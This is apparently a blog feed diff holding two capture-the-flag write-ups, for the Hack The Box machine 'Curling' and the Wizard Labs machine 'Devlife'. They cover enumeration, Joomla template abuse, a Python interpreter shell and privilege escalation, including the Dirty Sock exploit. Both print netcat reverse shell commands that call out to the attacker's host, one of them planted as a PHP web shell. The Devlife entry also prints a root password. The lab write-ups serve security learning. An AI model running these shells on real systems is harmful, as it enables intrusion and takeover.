-&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="Web" /><category term="Joomla" /><category term="RCE" /><category term="ssh" /><summary type="html">Quick Summary Hey guys today Curling retired and here is my write-up about it. I had a lot of fun doing this box as it was easy and simple. Also it was straightforward , no rabbit holes and such things. It’s a linux box and its ip is 10.10.10.150 I added it to /etc/hosts as curling.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC curling.htb We only get 2 open ports , 80 running http and 22 running ssh. Let’s look at http. HTTP Initial Enumeration We see a blog titled “Cewl Curling site!” , and it’s joomla. At this point I would run joomscan but I wanted to do some manual enumeration first , so I checked the source of the page and at the end of the body I found this comment : So I checked /secret.txt and found this base64 string : Decoding : Curling2018! we can use that as a password. But what is the username ? If we take a look at the main page again and read the posts : We will notice a name in one of the posts : Floris , now we can try to login as floris with the password Curling2018! : And it worked. While I was doing this enumeration I ran gobuster in the background and got these results : /.htpasswd (Status: 403) /.hta (Status: 403) /administrator (Status: 301) /.htaccess (Status: 403) /bin (Status: 301) /cache (Status: 301) /components (Status: 301) /images (Status: 301) /includes (Status: 301) /index.php (Status: 200) /language (Status: 301) /layouts (Status: 301) /libraries (Status: 301) /media (Status: 301) /modules (Status: 301) /plugins (Status: 301) /server-status (Status: 403) /templates (Status: 301) /tmp (Status: 301) Let’s go to /administrator and login to the administration panel : Editing Template Files and Getting a Reverse Shell : On the configuration section there’s an option for templates : By going to that we notice that protostar is the default style and template : From templates we will go to Protostar Details and Files and create a new php file : In the php file we will execute a system command to get a reverse shell : &amp;lt;?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.xx.xx 1337 &amp;gt;/tmp/f'); ?&amp;gt; After we save the file we will go to http://curling.htb/templates/protostar/file.php Then we check our listener : User We got a reverse shell as www-data , in the /home directory there’s a directory for floris : We don’t have read access to user.txt , but we notice a file called password_backup , by looking at that file : It’s a hex dump file , So I copied it to my box to reverse it : To reverse a hex dump file we will use xxd , so xxd -r pw_backup : Not a normal output , let’s redirect the output to a file and see : So what happened is , it turned out to be a bzip2 file so I decompressed it then got a new gzip file , decompressed it and got another bzip2 file , after decompression I got a tar file , then finally a txt file for the password : Let’s ssh as floris : And we owned user ! Curling By looking at the /home directory of floris again : There’s a directory called admin-area which contains two files : input and report input : url = &quot;http://127.0.0.1&quot; report : It’s obvious that this is the output of executing curl on http://127.0.0.1 : Even the name of the box is a hint curling , so what about changing that url from localhost to something else like a file ? Next time the command gets executed we will get the contents of that file , maybe root.txt ? But only if it’s getting executed by root. Let’s try and see if it will work : Then we will do : watch cat report , this is executing cat report every 2 seconds and giving us the output , easier than checking manually : After some time we get the flag. Dirty Sock ? Root shell ! I didn’t like the fact that I could only read the flag , I wanted a root shell. So I tried for a long time to bypass the url thing and get a reverse shell , but couldn’t. Then when I did this box again for the write-up , one of the things that caught my attention is that we are on an ubuntu box , so I checked snap version to know if it’s vulnerable to CVE-2019-7304 known as Dirty Sock and of course it was : This is not intended at all because by the time this box was released , CVE-2019-7304 wasn’t disclosed yet. I got the exploit from here , Then hosted it on a python simple http server and downloaded it on the box : python3 dirty_sockv2.py Now we can su to dirty_sock and execute commands as root : Or just sudo su and we will get a root shell : We owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Frolic Next Hack The Box write-up : Hack The Box - Vault</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/curling/0.png" /></entry></feed>
+&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="Web" /><category term="RCE" /><category term="Python" /><summary type="html">Quick Summary Hey guys this is my write-up about Devlife from Wizard Labs which is their second box to retire. Just like dummy it’s another easy box (Difficulty : 2/10) , It’s a linux box and its ip is 10.1.1.20 so let’s jump right in ! Nmap We will start with nmap to scan for open ports and services : nmap -sV -sT -sC 10.1.1.20 Only 2 ports are open , 22 running ssh and 80 running http. Let’s check http. HTTP Initial Enumeration On the main page we get this “About me” message and nothing else : About Me Hello , My name is Teddy Smith , I am a Python developer since 2007 ! Here I gonna share some Django tutorials and tutorials about System Administation in Python also I will write a Python online interpreter !! Stay Tuned ... TS I ran gobuster with /usr/share/wordlists/dirb/common.txt and got these results : /.htpasswd (Status: 403) /.htaccess (Status: 403) /.hta (Status: 403) /dev (Status: 301) /index.html (Status: 200) /manual (Status: 301) /server-status (Status: 403) Getting user So I checked /dev and found this Online Python 2.7 Interpreter : Great , now we can get a reverse shell in many ways , I just imported os then did os.system(reverse shell payload) : import os;os.system('nc -e /bin/bash 10.xx.xx.xx 1337') And we owned user ! Stored root Credentials , Privilege Escalation In the /home directory of tedd there is a directory called .env , Let’s check that. We notice a python script called su.py , which runs su root and uses the password to authenticate : import pexpect child = pexpect.spawn('su root') child.expect ('Password:') child.sendline('teddyxy2019') child.expect('\$') child.sendline('whoami') Now we can su to root using the password teddyxy2019 : And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Wizard Labs Write-up : Wizard Labs - Dummy</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/wizardlabs/devlife/0.png" /></entry></feed>
